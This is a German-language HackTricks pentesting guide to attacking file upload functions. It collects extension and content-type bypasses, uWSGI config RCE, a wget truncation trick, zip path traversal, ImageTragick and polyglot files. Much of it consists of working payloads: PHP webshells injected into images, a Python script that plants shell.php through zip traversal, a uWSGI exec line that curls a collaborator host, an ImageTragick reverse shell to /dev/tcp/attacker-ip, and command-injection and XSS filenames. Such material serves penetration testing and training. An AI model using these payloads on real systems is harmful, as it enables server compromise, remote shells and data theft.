# File Upload

{{#include ../../banners/hacktricks-training.md}}

## File Upload - Allgemeine Methodik

Andere nützliche Erweiterungen:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Umgehung von Prüfungen der Dateiendungen

1. Falls angewendet, überprüfe die **vorherigen Extensions**. Teste sie auch mit einigen **Großbuchstaben**: _pHp, .pHP5, .PhAr ..._
2. _Teste **das Hinzufügen einer gültigen Extension vor** der Ausführungs-Extension (verwende auch die vorherigen Extensions):_
- _file.png.php_
- _file.png.Php5_
3. Versuche, **Sonderzeichen am Ende** hinzuzufügen. Du kannst Burp nutzen, um alle **ascii** und **Unicode** Zeichen zu **bruteforcen**. (_Beachte, dass du auch die **zuvor** genannten **Extensions** verwenden kannst_)  
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Versuche, die Protektionen zu umgehen, indem du den Extension-Parser auf Serverseite **täuschst**, z. B. durch **Doppeln** der **Extension** oder Einfügen von **Junk**-Daten (**null** bytes) zwischen den Extensions. _Du kannst auch die **vorherigen Extensions** nutzen, um ein besseres Payload vorzubereiten._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Füge **eine weitere Schicht von Extensions** zu den vorherigen Checks hinzu:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Versuche, die **Exec-Extension vor der gültigen Extension** zu platzieren und hoffe, dass der Server falsch konfiguriert ist. (nützlich, um Apache-Fehlkonfigurationen auszunutzen, bei denen alles mit der Extension **.php**, aber **nicht notwendigerweise endend auf .php**, Code ausführt):
- _ex: file.php.png_
7. Verwendung von **NTFS alternate data stream (ADS)** in **Windows**. In diesem Fall wird ein Doppelpunkt ":" nach einer verbotenen Extension und vor einer erlaubten eingefügt. Dadurch wird eine **leere Datei mit der verbotenen Extension** auf dem Server erstellt (z. B. "file.asax:.jpg"). Diese Datei kann später mit anderen Techniken bearbeitet werden, z. B. über ihren Short Filename. Das Muster "**::$data**” kann ebenfalls verwendet werden, um nicht-leere Dateien zu erstellen. Daher kann das Hinzufügen eines Punktes nach diesem Muster helfen, weitere Restriktionen zu umgehen (z. B. "file.asp::$data.")
8. Versuche, die Dateinamensgrenzen zu sprengen. Die gültige Extension wird abgeschnitten und das bösartige PHP bleibt übrig. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Umgehung von Content-Type, Magic Number, Kompression & Resizing

- Umgehung von **Content-Type** Checks, indem der **Wert** des **Content-Type** Headers auf gesetzt wird: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **Wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Umgehung der **Magic Number** Prüfung, indem am Anfang der Datei die **Bytes eines echten Bildes** eingefügt werden (verwirrt das _file_ Kommando). Oder man fügt das Shell-Skript in die **Metadaten** ein:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oder man könnte das Payload **direkt in ein Bild einfügen**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Falls eine **Kompression** auf das Bild angewendet wird, z. B. durch Standard-PHP-Bibliotheken wie [PHP-GD](https://www.php.net/manual/fr/book.image.php), sind die vorherigen Techniken oft nicht nützlich. Du könntest jedoch das **PLTE chunk** [**im hier definierten Verfahren**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **Kompression überlebt**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die Webseite könnte das **Bild auch skalieren**, z. B. mit den PHP-GD Funktionen `imagecopyresized` oder `imagecopyresampled`. Du könntest jedoch das **IDAT chunk** [**im hier definierten Verfahren**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **Kompression überlebt**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Eine weitere Technik, um ein Payload zu erstellen, das **einem Image-Resizing standhält**, verwendet die PHP-GD Funktion `thumbnailImage`. Du kannst auch das **tEXt chunk** [**im hier definierten Verfahren**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **Kompression überlebt**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Weitere Tricks zum Prüfen

- Finde eine Verwundbarkeit, die es erlaubt, die bereits hochgeladene Datei **umzubenennen** (um die Extension zu ändern).
- Finde eine **Local File Inclusion** Verwundbarkeit, um die Backdoor auszuführen.
- **Mögliche Informationslecks**:
1. Lade **mehrfach** (und zur **gleichen Zeit**) dieselbe Datei mit demselben Namen hoch.
2. Lade eine Datei mit dem **Namen** einer **bereits existierenden Datei** oder eines **Ordners** hoch.
3. Lade eine Datei mit dem Namen **"."**, **".."** oder **"…"** hoch. Beispielsweise erstellt in Apache unter **Windows** der Dateiname "." eine Datei namens "uploads" im Verzeichnis "/www/", wenn die Anwendung die hochgeladenen Dateien im Verzeichnis "/www/uploads/" speichert.
4. Lade eine Datei, die nicht leicht gelöscht werden kann, wie z. B. **"…:.jpg"** unter **NTFS**. (Windows)
5. Lade eine Datei in **Windows** mit **ungültigen Zeichen** im Namen wie `|<>*?”`. (Windows)
6. Lade eine Datei in **Windows** mit reservierten (**verbotenen**) Namen wie CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 und LPT9.
- Versuche außerdem, eine **executable** (.exe) oder eine **.html** (weniger verdächtig) hochzuladen, die **Code ausführt**, wenn sie versehentlich vom Opfer geöffnet wird.

### Spezielle Extension-Tricks

Wenn du versuchst, Dateien auf einen **PHP server** hochzuladen, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Wenn du versuchst, Dateien auf einen **ASP server** hochzuladen, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` Dateien sind wie `.jar` für Java, aber für PHP, und können **wie eine PHP-Datei verwendet werden** (mit php ausgeführt oder in ein Script included werden...).

Die `.inc` Extension wird manchmal für PHP-Dateien verwendet, die nur zum **Importieren** von Dateien dienen, daher könnte an irgendeinem Punkt diese **Extension zur Ausführung erlaubt worden sein**.

## **Jetty RCE**

Wenn du eine XML-Datei auf einen Jetty-Server hochladen kannst, kannst du [RCE erhalten, weil **neue \*.xml und \*.war automatisch verarbeitet werden**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Wie im folgenden Bild erwähnt, lade die XML-Datei in `$JETTY_BASE/webapps/` hoch und erwarte die Shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Für eine detaillierte Untersuchung dieser Verwundbarkeit siehe die Original-Recherche: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) Verwundbarkeiten können bei uWSGI-Servern ausgenutzt werden, wenn man die Möglichkeit hat, die `.ini` Konfigurationsdatei zu verändern. uWSGI Konfigurationsdateien verwenden eine spezielle Syntax, um "magische" Variablen, Platzhalter und Operatoren einzubinden. Insbesondere der '@' Operator, verwendet als `@(filename)`, ist dafür vorgesehen, den Inhalt einer Datei einzubinden. Unter den verschiedenen in uWSGI unterstützten Schemes ist das "exec" scheme besonders mächtig, da es das Lesen von Daten aus der Standardausgabe eines Prozesses erlaubt. Diese Funktion kann für bösartige Zwecke wie Remote Command Execution oder Arbitrary File Write/Read missbraucht werden, wenn eine `.ini` Konfigurationsdatei verarbeitet wird.

Betrachte das folgende Beispiel einer schädlichen `uwsgi.ini` Datei, die verschiedene Schemes demonstriert:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die Ausführung des payloads erfolgt während des Parsings der Konfigurationsdatei. Damit die Konfiguration aktiviert und geparst wird, muss der uWSGI-Prozess entweder neu gestartet werden (potenziell nach einem Crash oder aufgrund eines Denial of Service) oder die Datei muss auf auto-reload gesetzt sein. Die auto-reload-Funktion, falls aktiviert, lädt die Datei in festgelegten Intervallen neu, sobald Änderungen erkannt werden.

Es ist entscheidend, die lockere Natur des Parsing der Konfigurationsdateien von uWSGI zu verstehen. Konkret kann der besprochene payload in eine binäre Datei (wie ein Bild oder PDF) eingefügt werden, wodurch der mögliche Exploit-Bereich weiter vergrößert wird.

## **wget File Upload/SSRF Trick**

In einigen Fällen kann es vorkommen, dass ein Server **`wget`** verwendet, um **Dateien herunterzuladen**, und man die **URL** angeben kann. In solchen Fällen prüft der Code möglicherweise, ob die Extension der heruntergeladenen Dateien in einer Whitelist enthalten ist, um sicherzustellen, dass nur erlaubte Dateien heruntergeladen werden. **Diese Prüfung kann jedoch umgangen werden.**\
Die **maximale** Länge eines **Dateinamens** in **linux** beträgt **255**, jedoch kürzt **wget** die Dateinamen auf **236** Zeichen. Man kann **eine Datei namens "A"\*232+".php"+".gif" herunterladen**, dieser Dateiname wird die **Prüfung umgehen** (da in diesem Beispiel **".gif"** eine **gültige** Extension ist), aber `wget` wird die Datei in **"A"\*232+".php"** umbenennen.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Beachte, dass **eine andere Option**, die dir möglicherweise einfällt, um diese Prüfung zu umgehen, darin besteht, den **HTTP-Server auf eine andere Datei umzuleiten**, sodass die ursprüngliche URL die Prüfung umgeht und wget dann die umgeleitete Datei mit dem neuen Namen herunterlädt. Das **funktioniert nicht**, **es sei denn** wget wird mit dem **Parameter** `--trust-server-names` verwendet, weil **wget die umgeleitete Seite mit dem Namen der Datei herunterladen wird, der in der ursprünglichen URL angegeben ist**.

## Werkzeuge

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) ist ein leistungsstarkes Tool, das Pentesters und Bug Hunters dabei unterstützt, file upload-Mechanismen zu testen. Es nutzt verschiedene bug bounty-Techniken, um den Prozess der Identifizierung und Ausnutzung von Schwachstellen zu vereinfachen und so gründliche Bewertungen von Webanwendungen zu ermöglichen.

### Corrupting upload indices with snprintf quirks (historical)

Einige veraltete Upload-Handler, die `snprintf()` oder ähnliches verwenden, um multi-file arrays aus einem single-file upload zu bauen, können dazu verleitet werden, die `_FILES`-Struktur zu fälschen. Aufgrund von Inkonsistenzen und Abschneidungen im Verhalten von `snprintf()` kann ein sorgfältig gestalteter einzelner Upload auf der Serverseite als mehrere indizierte Dateien erscheinen und somit Logik verwirren, die eine feste Form annimmt (z. B. ihn als multi-file upload behandelt und unsichere Pfade wählt). Obwohl heute eher nischig, taucht dieses „index corruption“-Muster gelegentlich in CTFs und älterem Code wieder auf.

## Vom File-Upload zu anderen Schwachstellen

- Setze **filename** auf `../../../tmp/lol.png` und versuche, einen **path traversal** zu erreichen
- Setze **filename** auf `sleep(10)-- -.jpg` und du könntest eine **SQL injection** erreichen
- Setze **filename** auf `<svg onload=alert(document.domain)>` um eine **XSS** zu erzielen
- Setze **filename** auf `; sleep 10;` um einige command injection-Fälle zu testen (mehr [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probiere **different svg payloads** von [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Wenn du dem Webserver **anweisen** kannst, ein Bild von einer URL zu holen, könntest du versuchen, ein [SSRF](../ssrf-server-side-request-forgery/index.html) auszunutzen. Wenn dieses **image** an einem **öffentlichen** Ort gespeichert wird, könntest du auch eine URL von [https://iplogger.org/invisible/](https://iplogger.org/invisible/) angeben und **Informationen jedes Besuchers stehlen**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Speziell gestaltete PDFs für XSS: Die [folgende Seite zeigt, wie man **PDF-Daten injiziert, um JS-Ausführung zu erreichen**](../xss-cross-site-scripting/pdf-injection.md). Wenn du PDFs hochladen kannst, könntest du ein PDF vorbereiten, das gemäß den angegebenen Hinweisen beliebiges JS ausführt.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content, um zu prüfen, ob der Server irgendeine **antivirus**-Lösung hat
- Prüfe, ob es eine **Größenbegrenzung** beim Hochladen von Dateien gibt

Hier ist eine Top-10-Liste von Dingen, die du durch Upload erreichen kannst (von [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magische Header-Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Siehe [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) für weitere Dateitypen.

## Zip/Tar-Datei, die automatisch entpackt wird

Wenn du eine ZIP hochladen kannst, die auf dem Server entpackt wird, kannst du zwei Dinge tun:

### Symlink

Lade einen Link hoch, der soft links zu anderen Dateien enthält; beim Zugriff auf die entpackten Dateien greifst du auf die verlinkten Dateien zu:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### In verschiedene Ordner dekomprimieren

Die unerwartete Erstellung von Dateien in Verzeichnissen während der Dekomprimierung ist ein erhebliches Problem. Trotz der anfänglichen Annahme, dass diese Konfiguration OS-level command execution durch malicious file uploads verhindern könnte, lassen sich die hierarchische Komprimierungsunterstützung und die directory traversal-Fähigkeiten des ZIP archive format ausnutzen. Dadurch können Angreifer Einschränkungen umgehen und aus sicheren Upload-Verzeichnissen entkommen, indem sie die Dekomprimierungsfunktionalität der Zielanwendung manipulieren.

Ein automatisierter Exploit zum Erstellen solcher Dateien ist unter [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) verfügbar. Das Tool kann wie folgt verwendet werden:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Zusätzlich ist der **symlink trick with evilarc** eine Option. Wenn das Ziel darin besteht, eine Datei wie `/flag.txt` anzuvisieren, sollte ein symlink zu dieser Datei in Ihrem System erstellt werden. Das stellt sicher, dass evilarc während seiner Ausführung nicht auf Fehler stößt.

Nachfolgend ein Beispiel für Python code, das verwendet wird, um eine malicious zip file zu erstellen:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Komprimierung zum file spraying ausnutzen**

Für weitere Details **siehe den Originalbeitrag**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP-Code wird geschrieben, um Befehle auszuführen, die über die `$_REQUEST`-Variable übergeben werden.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Mehrere Dateien werden erstellt und ein zip-Archiv mit diesen Dateien angelegt.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Die Namen der Dateien im zip werden mit vi oder einem Hex-Editor verändert, indem "xxA" zu "../" geändert wird, um Verzeichnisse zu traversieren.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Lade diesen Inhalt mit einer Bild-Erweiterung hoch, um die Schwachstelle auszunutzen **(ImageMagick , 7.0.1-1)** (aus dem [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Einbetten einer PHP Shell in PNG

Das Einbetten einer PHP Shell in den IDAT-Chunk einer PNG-Datei kann bestimmte Bildverarbeitungsoperationen effektiv umgehen. Die Funktionen `imagecopyresized` und `imagecopyresampled` aus PHP-GD sind in diesem Zusammenhang besonders relevant, da sie üblicherweise zum Skalieren bzw. Resampling von Bildern verwendet werden. Dass die eingebettete PHP Shell von diesen Operationen unbeeinträchtigt bleibt, ist für bestimmte Anwendungsfälle ein deutlicher Vorteil.

Eine detaillierte Untersuchung dieser Technik, einschließlich Methodik und möglicher Anwendungsfälle, findet sich in folgendem Artikel: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Diese Ressource bietet ein umfassendes Verständnis des Prozesses und seiner Implikationen.

Mehr Informationen unter: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot-Dateien

Polyglot-Dateien sind ein einzigartiges Werkzeug in der Cybersicherheit und funktionieren wie Chamäleons, da sie gleichzeitig in mehreren Dateiformaten gültig sein können. Ein interessantes Beispiel ist ein [GIFAR](https://en.wikipedia.org/wiki/Gifar), eine Hybriddatei, die sowohl als GIF als auch als RAR-Archiv funktioniert. Solche Dateien beschränken sich nicht auf dieses Paar; Kombinationen wie GIF und JS oder PPT und JS sind ebenfalls möglich.

Der Kernnutzen von Polyglot-Dateien liegt in ihrer Fähigkeit, Sicherheitsmaßnahmen zu umgehen, die Dateien anhand ihres Typs prüfen. In vielen Anwendungen werden nur bestimmte Dateitypen zum Upload erlaubt — z. B. JPEG, GIF oder DOC — um das Risiko potenziell gefährlicher Formate (z. B. JS, PHP oder Phar) zu reduzieren. Ein Polyglot, der die strukturellen Kriterien mehrerer Dateitypen erfüllt, kann diese Beschränkungen unauffällig umgehen.

Trotz ihrer Anpassungsfähigkeit stoßen Polyglots auf Einschränkungen. Beispielsweise kann ein Polyglot zwar gleichzeitig eine PHAR-Datei (PHp ARchive) und ein JPEG darstellen, der Erfolg des Uploads hängt jedoch oft von den Richtlinien bzgl. Dateierweiterungen der Plattform ab. Ist das System streng bei erlaubten Extensions, reicht die strukturelle Dualität eines Polyglots möglicherweise nicht aus, um den Upload zu gewährleisten.

Mehr Informationen unter: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Gültige JSONs hochladen, als wären sie PDF

Wie man Dateityp-Erkennungen umgeht, indem man eine gültige JSON-Datei hochlädt, obwohl das nicht erlaubt ist, indem man sie als PDF vortäuscht (Techniken aus **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Solange die `%PDF` Magic-Bytes in den ersten 1024 Bytes stehen, gilt die Datei als gültig (Beispiel im Artikel)
- **`pdflib` library**: Füge ein gefälschtes PDF-Format in ein Feld des JSON ein, sodass die Library denkt, es sei ein PDF (Beispiel im Artikel)
- **`file` binary**: Es kann bis zu 1048576 Bytes aus einer Datei lesen. Erstelle einfach ein JSON, das größer ist als das, so dass es den Inhalt nicht als JSON parsen kann, und füge dann innerhalb des JSON den Anfangsteil eines echten PDFs ein — es wird es als PDF erkennen

## Referenzen

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
